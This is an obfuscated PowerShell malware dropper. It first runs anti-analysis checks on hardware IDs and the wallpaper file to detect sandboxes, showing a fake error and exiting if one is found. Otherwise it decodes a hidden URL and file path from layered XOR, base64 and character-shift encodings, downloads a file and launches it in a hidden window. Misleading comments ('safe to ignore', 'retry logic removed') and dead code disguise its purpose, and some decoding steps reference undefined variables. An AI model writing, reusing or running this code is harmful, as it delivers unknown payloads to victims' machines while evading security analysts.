function Test-AntiTriage {
    $R2CeTpq1 = ($GwAlH:COMPUTERNAME.Length -lt 0)

# Only used in fallback scenarios
    try {
        $VTp3Zf = Get-CimInstance -ClassName Win32_DiskDrive | Select-Object Model, SerialNumber
        if ($VTp3Zf.Model -match $($dLdDh=([System.Text.Encoding]::UTF8.GetString([byte[]](0x71,0x53,0x61,0x47,0x35,0x44,0x5B)));$oh2fGv=[byte[]](0x26,0x17,0x22,0x67,0x62,0x00,0x08,0x40,0x63,0x51,0x13,0x07,0x06,0x6B,0x30);$hao4Qc=[System.Text.Encoding]::UTF8.GetBytes($dLdDh);-join(0..($oh2fGv.Length-1)|%{[char]($oh2fGv[$_]-bxor$kb[$_%$hao4Qc.Length])})) -or $VTp3Zf.SerialNumber -match ([System.Text.Encoding]::UTF8.GetString([byte[]](0x32,0x33,0x32,0x31,0x33,0x38,0x38,0x30,0x34,0x31,0x36,0x35)))) {
            $R2CeTpq1 = (!0)
        }
    } catch {}

# Marking for future review if needed
    try {
        $LoZDZL = Get-CimInstance -ClassName Win32_Keyboard | Select-Object Description, DeviceID
        if ($LoZDZL.DeviceID -match (-join([char]0x41, [char]0x43, [char]0x50, [char]0x49, [char]0x5C, [char]0x5C, [char]0x50, [char]0x4E, [char]0x50, [char]0x30, [char]0x33, [char]0x30, [char]0x33)) -or $LoZDZL.Description -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($($Adq2R=('{0}{1}{2}{3}{4}{5}{6}{7}{8}' -f '7!a','V?','W','JY','%C','0','H','T>','O');$YZQhyt0=[byte[]](0x62,0x12,0x33,0x3E,0x5D,0x3A,0x18,0x31,0x46,0x2E,0x61,0x2F,0x01,0x78,0x02,0x41,0x6C,0x08,0x14,0x73,0x0D,0x12,0x35,0x4C,0x21,0x02,0x0E,0x2D,0x64,0x0E,0x0A,0x1C);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($Adq2R);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])})))))) {
            $R2CeTpq1 = ($PSVersionTable.PSVersion.Major -ge 1)
        }
    } catch {}

# Looks okay, revisit if failures increase
    try {
        $oRK4 = Get-CimInstance -ClassName Win32_PointingDevice | Select-Object Description, PNPDeviceID
        if ($oRK4.PNPDeviceID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0JDigIzQoeKAjdCg4oCMSeKAi1zigI1c4oCN0KDigIxO4oCL0KDigIvQnuKAi0bigI3QhuKAjTPigIx84oCLVeKAjFPigIzQkuKAjFzigI1c4oCMVuKAjEnigI1E4oCMX+KAjNCe4oCNNuKAjDLigIw34oCMJuKAjdCg4oCMSeKAjUTigI1f4oCM0J7igIzQnuKAjNCe4oCN0IbigIs='))) -or $oRK4.Description -match ($($B3si8pr=('{0}{1}{2}{3}' -f 'JFWMR','l!u','[%v<b','V');$YZQhyt0=[byte[]](0x1A,0x15,0x78,0x7F,0x72,0x2F,0x4E);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($B3si8pr);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bdGA0LB00ZZibNC1')))+$(-join((-join(' ','E','gm','kw','|')).ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+8)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+8)%26))}else{[char]$dLgoF}}))+($($k7760='h,KW&B1>vd';$b=[byte[]](0x13,0x1C,0x36);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7760);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -f $($k4801='oPf3D>tK';$b=[byte[]](0x3A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4801);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))+([System.Text.Encoding]::UTF8.GetString([byte[]](0x53,0x42,0x20,0x49,0x6E,0x70,0x75)))+((-join([char]0x7B, [char]0x30, [char]0x7D, [char]0x7B, [char]0x31, [char]0x7D, [char]0x7B, [char]0x32, [char]0x7D)) -f 't',$(-join(' '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})),([System.Text.Encoding]::UTF8.GetString([byte[]](0x44))))+((-join([char]0x7B, [char]0x30, [char]0x7D, [char]0x7B, [char]0x31, [char]0x7D, [char]0x7B, [char]0x32, [char]0x7D)) -f ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dmk='))),('c'+'e')))) {
            $R2CeTpq1 = ([math]::Pi -gt 3)
        }
    } catch {}

    try {
        $G8C8gMB = Get-CimInstance -ClassName Win32_DesktopMonitor | Select-Object Description, PNPDeviceID
        if ($G8C8gMB.PNPDeviceID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join('U','kVsVFVF','eE','JXV','nhjVW','toV','U1US','X','pOQT09')))))))) -or $G8C8gMB.Description -match $($S6t3b3Og = (1127 / 7);$YZQhyt0=[byte[]](0xe6,0x43,0x21,0x2c,0xc4,0x43,0x21,0x2d,0xcf,0x43,0x21,0x2c,0xc4,0x43,0x21,0x2a,0xd3,0x43,0x21,0x2d,0xc8,0x43,0x21,0x2d,0xc2,0x43,0x21,0x2d,0x81,0x43,0x21,0x2a,0xf1,0x43,0x21,0x2d,0xcf,0x43,0x21,0x2d,0xf1,0x43,0x21,0x2d,0x81,0x43,0x21,0x2a,0xec,0x43,0x21,0x2c,0xce,0x43,0x21,0x2a,0xcf,0x43,0x21,0x2c,0xc8,0x43,0x21,0x2a,0xd5,0x43,0x21,0x2c,0xce,0x43,0x21,0x2a,0xd3,0x43,0x21,0x2d);-join($YZQhyt0|%{[char]($_-bxor$k8797)}))) {
            $R2CeTpq1 = ([math]::Pi -gt 3)
        }
    } catch {}

# Retry logic removed (no longer needed)
    try {
        $yWCB = Get-CimInstance -ClassName Win32_Processor | Select-Object Name
        if ($yWCB.Name -match $(-join($($dQiNpT = (7 * 31);$YZQhyt0=[byte[]](0x94,0xab,0xa1,0xb0,0xa9,0xf9,0x9e,0xaa,0xaf,0xb0,0xf9,0x8d,0xaf,0xaa,0xbe,0xb0,0xae,0xae,0xaa,0xaf,0xf9,0x85,0xf1,0x9f,0xaf,0xaa,0xbc,0xb1,0xb8,0xb0,0xa9,0xa9,0x85,0xf0);-join($YZQhyt0|%{[char]($_-bxor$k2230)})).ToCharArray()|%{[int]$fYDv=$_;if($fYDv-ge65-and$c-le90){[char](65+(($fYDv-65+22)%26))}elseif($fYDv-ge97-and$c-le122){[char](97+(($fYDv-97+22)%26))}else{[char]$fYDv}}))) {
            $R2CeTpq1 = ($PSVersionTable.PSVersion.Major -ge 1)
        }
    } catch {}

# Sanity fallback; may never trigger, safe to ignore
    try {
        $vQgzyHNY = (Get-ItemProperty $($QHQx = (-289 -bxor -375);$oh2fGv=[byte[]](0x1e,0x1d,0x15,0x03,0x6c,0x0a,0x15,0x39,0x38,0x22,0x24,0x39,0x3a,0x76,0x06,0x37,0x38,0x33,0x3a,0x0a,0x12,0x33,0x25,0x3d,0x22,0x39,0x26);-join($oh2fGv|%{[char]($_-bxor$k9076)}))).Wallpaper
        if ($vQgzyHNY -and (Test-Path $vQgzyHNY)) {
            $tV3bf = [System.IO.File]::ReadAllBytes($vQgzyHNY)
            $nR0j = [Convert]::ToBase64String($tV3bf)
            if ($nR0j.Length -gt 64) {
                $UQsj = $nR0j.Substring(0, 64)
                if ($UQsj -eq (('{‌0‌}‍'+'{‍1'+'‍}‍{‌2'+'‌}‌'+'{‌3​}​{‌'+'4​}'+'‌'+'{‍5‍}‌'+'{‌6​}‍{'+'‌7‍}'+'​{‍8​}'+'​{‌9‌}‌{'+'‍1​0‌}​'+'{'+'​1‌1‌}‍{'+'​1‍2‍}​{'+'​1'+'‌3‍}‍'+'{‌1‌4‌'+'}‍{‌1‍'+'5‌}‍{'+'​1​6‍'+'}‌{‌1‍'+'7'+'‍}​{‍1​8'+'‌}​'+'{‌1‍9​}'+'​{'+'​2‌0‍}‌'+'{‍2​1‍}​'+'{‌2​2​'+'}‍{‍2‍'+'3‍}​') -f ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('THpscUx6UT0=')))))),$($kDs8TH=(-join('b)r+','w','U[+','N-'));$YZQhyt0=[byte[]](0x23,0x68);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($kDs8TH);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])})),([System.Text.Encoding]::UTF8.GetString([byte[]](0x51,0x53,0x6B))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([string]::Format('{0}{1}{2}','WkpSZ','0E','='))))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qg=='))),$($aZlbThKX=(-join('.)','GQy%KE','apG&M','I'));$YZQhyt0=[byte[]](0x6F,0x78,0x06,0x10,0x38);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($aZlbThKX);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])})),$($SySRfSY0 = (739 -bxor 639);$YZQhyt0=[byte[]](0xcd);-join($YZQhyt0|%{[char]($_-bxor$k3754)})),$(-join((-join('F','GF')).ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+21)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+21)%26))}else{[char]$dLgoF}})),('{0}' -f (-join([char]0x41, [char]0x44))),$($NDZsz7tL='1‌g​A‌)‌%‌t‍v‍L‍L​';$YZQhyt0=[byte[]](0x1E,0x55,0x36,0x6A);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($NDZsz7tL);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])})),$(-join($($k8342='^sJK}+CK=bXvD';$b=[byte[]](0x0B,0x22,0x1B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8342);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})).ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+10)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+10)%26))}else{[char]$dLgoF}})),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dw=='))),(('M'+'D')+$($k5178='?NXPf';$b=[byte[]](0x7E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5178);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))),($($k9598=163;$b=[byte[]](0xd4);-join($b|%{[char]($_-bxor$k9598)}))+$($k8544=65;$b=[byte[]](0x0c);-join($b|%{[char]($_-bxor$k8544)}))+$($k5106='L&A%&B';$b=[byte[]](0x08,0x67);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5106);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUU4PQ==')))))),([string]::Format('{О}',([string]::Format('{0}','Dg')))),('{О}' -f ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MA==')))),('{0}{1}' -f ('{0}' -f 'S'),('E'+'x'+'E')),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join('VE','U='))))),([System.Text.Encoding]::UTF8.GetString([byte[]](0x68,0x73))),(-join([char]0x59, [char]0x46)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('аFlZR3k='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Zw=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join([char]0x5A, [char]0x41, [char]0x3D, [char]0x3D))))))) {
                    $R2CeTpq1 = ([math]::Pi -gt 3)
                }
            }
        }
    } catch {}

    return $R2CeTpq1
}

# Prevents known issue on rare edge cases
if (Test-AntiTriage) {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show((-join($(-join('L'.ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+23)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+23)%26))}else{[char]$dLgoF}}))'','m',$($YtA8g=('S}'+'9'+'+bJ'+'2');$YZQhyt0=[byte[]](0x73,0x0E,0x56,0x59,0x10,0x33);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($YtA8g);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])})),(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA==')))+([string]::Format('{0}','B'))),(-join([char]0x75)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('dCB'+'0'+'aGlz'+'IA'+'==')))),('a'+'‍'+'p‍'),$(-join((-join('tp','m','ge','xm')).ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+22)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+22)%26))}else{[char]$dLgoF}})),(-join('о','n ')),('{0}{1}' -f $($k8146=144;$b=[byte[]](0xf3,0xf1,0xfe,0xfe,0xff);-join($b|%{[char]($_-bxor$k8146)})),'t'),$($ItcC7hy = (-747 -bxor -526);$YZQhyt0=[byte[]](0xc7,0x95,0x92);-join($YZQhyt0|%{[char]($_-bxor$k2424)})),$($w8gi = (869 - 679);$YZQhyt0=[byte[]](0xd0,0x9e,0xd7,0xd0,0x9e,0xe8,0xd7,0xcc);-join($YZQhyt0|%{[char]($_-bxor$k3729)})),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZEhWaGJDQk5ZUT09')))))),(-join('сhі','nе')),$($k6737=87;$b=[byte[]](0x79);-join($b|%{[char]($_-bxor$k6737)})))), ([System.Text.Encoding]::UTF8.GetString([byte[]](0x45,0x72,0x72,0x6F,0x72))), [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
    exit
}

$yoK8RK = $($H0dVok=($($k2991=149;$b=[byte[]](0xee,0xa5,0xe8,0xee,0xa4,0xe8,0xee,0xa7,0xe8,0xee,0xa6,0xe8,0xee,0xa1,0xe8,0xee,0xa0,0xe8,0xee,0xa3,0xe8,0xee,0xa2,0xe8);-join($b|%{[char]($_-bxor$k2991)})) -f ([System.Text.Encoding]::UTF8.GetString([byte[]](0x3A,0x21,0x56))),('{0}' -f '?'),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PEo2'))),(-join([char]0x23)),$($k2017='p-S,q)W(Q7';$b=[byte[]](0x31,0x1D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2017);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})),([System.Text.Encoding]::UTF8.GetString([byte[]](0x3E))),(-join([char]0x23)),$(-join('>'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})));$oh2fGv=[byte[]](0x52,0x55,0x22,0x4F,0x4F,0x70,0x19,0x0C,0x26,0x59,0x4A,0x4B,0x4B,0x58,0x0F,0x35,0x50,0x51,0x65,0x58,0x52,0x2E,0x48,0x0D,0x0C,0x4E,0x53,0x46,0x79,0x4D,0x5D,0x3D,0x19,0x51,0x24,0x56,0x4D,0x0C,0x56,0x5F,0x40,0x32,0x4C,0x13,0x27,0x57,0x4A,0x2F,0x1F,0x44,0x42,0x52,0x43,0x51,0x37,0x0E,0x12,0x2F,0x4E,0x46);$hao4Qc=[System.Text.Encoding]::UTF8.GetBytes($H0dVok);-join(0..($oh2fGv.Length-1)|%{[char]($oh2fGv[$_]-bxor$kb[$_%$hao4Qc.Length])}))
$WsUCr = ($fth0 + $($U2kmvpc=$(-join((-join([char]0x31, [char]0x6F, [char]0x75, [char]0x66, [char]0x63, [char]0x72, [char]0x6C, [char]0x7B, [char]0x4E, [char]0x6C, [char]0x44, [char]0x31)).ToCharArray()|%{[int]$dLgoF=$_;if($dLgoF-ge65-and$c-le90){[char](65+(($dLgoF-65+9)%26))}elseif($dLgoF-ge97-and$c-le122){[char](97+(($dLgoF-97+9)%26))}else{[char]$dLgoF}}));$oh2fGv=[byte[]](0x0B,0x2C,0x21,0x22,0x3C,0x3D,0x0F,0x1A,0x3B,0x0C,0x3D,0x50,0x00,0x56,0x01,0x17,0x09);$hao4Qc=[System.Text.Encoding]::UTF8.GetBytes($U2kmvpc);-join(0..($oh2fGv.Length-1)|%{[char]($oh2fGv[$_]-bxor$kb[$_%$hao4Qc.Length])})))

try {
    $yHtXvKyj = New-Object System.Net.WebClient
    $yHtXvKyj.Headers.Add((((-join([char]0x55))+('{0}' -f 's')+$(-join('j'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))+$($k4165=193;$b=[byte[]](0xb3);-join($b|%{[char]($_-bxor$k4165)})))+("$([char]0x7B)$([char]0x30)$([char]0x7D)$([char]0x7B)$([char]0x31)$([char]0x7D)" -f $(-join('-K'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}})),$(-join('k'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})))+$($k9793='DA}%:%l)m5)b';$b=[byte[]](0x21);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9793);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+([System.Text.Encoding]::UTF8.GetString([byte[]](0x6E)))+$($fXZBR=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JHRnMkk/NW5sNi0yWEg=')));$YZQhyt0=[byte[]](0x50);$QabAYwzW=[System.Text.Encoding]::UTF8.GetBytes($fXZBR);-join(0..($YZQhyt0.Length-1)|%{[char]($YZQhyt0[$_]-bxor$kb[$_%$QabAYwzW.Length])}))), $($jvFmVp = (3 * 69);$oh2fGv=[byte[]](0x82,0xa0,0xb5,0xa6,0xa3,0xa3,0xae,0xe0,0xfa,0xe1,0xff);-join($oh2fGv|%{[char]($_-bxor$k6319)})))
    $yHtXvKyj.DownloadFile($yoK8RK, $WsUCr)
    
    if (Test-Path $WsUCr) {
        Start-Process $WsUCr -WindowStyle Hidden
    }
} catch {
# Applying safe default to avoid null conditions
}
if ($false) {
    $jsonContent = '{ "featureEnabled": true, "retryCount": 3 }'; $parsedJson = $jsonContent | ConvertFrom-Json; if ($parsedJson.featureEnabled) { Write-Host "Feature is enabled (simulated JSON read)." }
}
$AWVMZV = Get-Random -Minimum 1000 -Maximum 9999; $fhZH = $($AWVMZV / 2); $AWVMZV = $fhZH * 2; $AWVMZV = $null; $fhZH = $null
